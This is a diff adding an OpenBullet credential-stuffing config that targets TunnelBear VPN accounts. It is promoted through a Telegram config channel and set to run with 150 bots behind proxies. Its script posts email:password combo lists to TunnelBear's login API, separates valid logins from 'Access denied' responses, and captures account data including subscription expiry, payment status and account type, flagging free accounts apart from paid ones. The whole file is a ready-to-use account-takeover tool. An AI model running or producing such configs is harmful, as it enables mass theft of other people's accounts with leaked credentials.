@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "TunnelBear VPN",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-04T16:52:40.5859134+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/OpenBulletConfigs | Capture | High CPM | Move Free To Custom",
+  "Author": "@TheOwn",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.tunnelbear.com/core/api/login" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&withUserDetails=true&v=web-1.0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Access denied" 
+  KEYCHAIN Success OR 
+    KEY ",\"user\":\"" 
+
+#User PARSE "<SOURCE>" LR "user\":\"" "\"" -> CAP "User" 
+
+#Full_Version_Until PARSE "<SOURCE>" LR "fullVersionUntil\":\"" "\"" -> CAP "Full Version Until" 
+
+#Active_GOTB PARSE "<SOURCE>" LR "activeGOTB\":" "," -> CAP "Active GOTB" 
+
+#Payment_Status PARSE "<SOURCE>" LR "paymentStatus\":\"" "\"" -> CAP "Payment Status" 
+
+#Bear_Type PARSE "<SOURCE>" LR "bearType\":\"" "\"" -> CAP "Bear Type" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "fullVersion\":\"0" 
+
